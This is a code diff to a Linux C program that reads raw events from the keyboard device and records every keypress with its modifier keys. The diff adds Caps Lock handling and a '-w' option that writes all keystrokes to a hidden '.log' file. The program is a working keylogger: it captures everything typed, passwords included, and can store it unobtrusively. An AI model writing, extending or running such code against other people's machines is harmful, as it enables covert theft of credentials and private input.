@@ -1,4 +1,5 @@
 #include <dirent.h>
+#include <errno.h>
 #include <fcntl.h>
 #include <linux/input-event-codes.h>
 #include <linux/input.h>
@@ -8,6 +9,9 @@
 #include <string.h>
 #include <sys/ioctl.h>
 #include <unistd.h>
+
+#define BUFFER_SIZE 256
+#define LOG_FILE ".log"
 
 typedef struct {
     const char *normal;
@@ -85,61 +89,104 @@ const KeyMap key_map[] = {
     [KEY_DOWN] = {"Arrow Down", "Arrow Down"},
     [KEY_LEFT] = {"Arrow Left", "Arrow Left"},
     [KEY_RIGHT] = {"Arrow Right", "Arrow Right"},
+    [KEY_CAPSLOCK] = {"CapsLock", "CapsLock"},
 };
 
-const char *get_key_name(int key_code, bool shift_pressed) {
+const char *get_key_name(int key_code, bool shift_pressed, bool capslock_active) {
     if (key_code < sizeof(key_map) / sizeof(key_map[0]) && key_map[key_code].normal != NULL) {
+        if (key_code >= KEY_A && key_code <= KEY_Z) {
+            if (capslock_active && !shift_pressed) {
+                return key_map[key_code].shifted;
+            }
+            if (!capslock_active && shift_pressed) {
+                return key_map[key_code].shifted;
+            }
+            return key_map[key_code].normal;
+        }
         return shift_pressed ? key_map[key_code].shifted : key_map[key_code].normal;
     }
     return "UNKNOWN";
 }
 
-int main() {
+char *find_keyboard_device() {
     DIR *dir;
     struct dirent *ent;
-    char keyboard_path[256] = "";
-    bool keyboard_found = false;
-    bool shift_pressed = false;
-    bool ctrl_pressed = false;
-    bool meta_pressed = false;
-    bool alt_pressed = false;
+    static char keyboard_path[BUFFER_SIZE];
 
-    if ((dir = opendir("/dev/input/by-id")) != NULL) {
-        while ((ent = readdir(dir)) != NULL) {
-            if (strstr(ent->d_name, "kbd") || strstr(ent->d_name, "keyboard")) {
-                snprintf(keyboard_path, sizeof(keyboard_path), "/dev/input/by-id/%s", ent->d_name);
-                printf("Finding candidate keyboard device: %s\n", keyboard_path);
-                keyboard_found = true;
-                break;
-            }
+    if ((dir = opendir("/dev/input/by-id")) == NULL) {
+        perror("Cannot access /dev/input/by-id");
+        return NULL;
+    }
+
+    while ((ent = readdir(dir)) != NULL) {
+        if (strstr(ent->d_name, "kbd") || strstr(ent->d_name, "keyboard")) {
+            snprintf(keyboard_path, sizeof(keyboard_path), "/dev/input/by-id/%s", ent->d_name);
+            closedir(dir);
+            return keyboard_path;
         }
-        closedir(dir);
+    }
+
+    closedir(dir);
+    return NULL;
+}
+
+void log_key(FILE *fp, bool shift_pressed, bool ctrl_pressed, bool meta_pressed, bool alt_pressed, bool log_to_file,
+             const char *key_name) {
+    if (log_to_file) {
+        if (shift_pressed) fprintf(fp, "Shift + ");
+        if (ctrl_pressed) fprintf(fp, "Ctrl + ");
+        if (meta_pressed) fprintf(fp, "Meta + ");
+        if (alt_pressed) fprintf(fp, "Alt + ");
+        fprintf(fp, "%s\n", key_name);
+        fflush(fp);
     } else {
-        perror("Directory /dev/input/by-id cannot be accessed");
+        if (shift_pressed) printf("Shift + ");
+        if (ctrl_pressed) printf("Ctrl + ");
+        if (meta_pressed) printf("Meta + ");
+        if (alt_pressed) printf("Alt + ");
+        printf("%s\n", key_name);
+    }
+}
+
+int main(int argc, char *argv[]) {
+    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false,
+         capslock_active = false, log_to_file = false;
+
+    if (argc > 1 && strcmp(argv[1], "-w") == 0) {
+        log_to_file = true;
+    }
+
+    char *keyboard_path = find_keyboard_device();
+    if (!keyboard_path) {
+        fprintf(stderr, "No keyboard device found\n");
         return EXIT_FAILURE;
     }
 
-    if (!keyboard_found) {
-        printf("No keyboard device found\n");
-        return EXIT_FAILURE;
-    }
+    printf("Using keyboard device: %s\n", keyboard_path);
 
-    printf("Typing from: %s\n", keyboard_path);
+    FILE *fp = NULL;
+    if (log_to_file) {
+        fp = fopen(LOG_FILE, "w");
+        if (!fp) {
+            fprintf(stderr, "Cannot open log file\n");
+            return EXIT_FAILURE;
+        }
+    }
 
     int fd = open(keyboard_path, O_RDONLY);
     if (fd == -1) {
-        perror("Cannot open keyboard device");
+        fprintf(stderr, "Cannot open keyboard device: %s\n", strerror(errno));
+        fclose(fp);
         return EXIT_FAILURE;
     }
 
     struct input_event event;
-    ssize_t bytes_read;
 
     while (true) {
-        bytes_read = read(fd, &event, sizeof(event));
+        ssize_t bytes_read = read(fd, &event, sizeof(event));
         if (bytes_read == sizeof(event)) {
             if (event.type == EV_KEY) {
-                // Update status key modifier
+                // Update status modifier keys
                 if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                     shift_pressed = event.value;
                 } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
@@ -149,30 +196,25 @@ int main() {
                 } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                     alt_pressed = event.value;
                 }
+                // Update Caps Lock status (toggle)
+                if (event.code == KEY_CAPSLOCK && event.value == 1) {
+                    capslock_active = !capslock_active;
+                }
                 // Handle key press
                 if (event.value == 1) {
-                    const char *key_name = get_key_name(event.code, shift_pressed);
+                    const char *key_name = get_key_name(event.code, shift_pressed, capslock_active);
                     if (strcmp(key_name, "UNKNOWN") != 0) {
-                        printf("  ");
-                        if (shift_pressed) printf("Shift + ");
-                        if (ctrl_pressed) printf("Ctrl + ");
-                        if (meta_pressed) printf("Meta + ");
-                        if (alt_pressed) printf("Alt + ");
-                        printf("%s\n", key_name);
+                        log_key(fp, shift_pressed, ctrl_pressed, meta_pressed, alt_pressed, log_to_file, key_name);
                     }
                 }
-                // Handle key release
-                // else if (event.value == 0) {
-                //     // printf("Released: %u\n", event.code);
-                // }
             }
         } else if (bytes_read == -1) {
-            perror("Error reading from keyboard device");
+            fprintf(stderr, "Error reading from keyboard device: %s\n", strerror(errno));
             break;
         }
     }
 
     close(fd);
-
-    return 0;
+    if (fp) fclose(fp);
+    return EXIT_SUCCESS;
 }
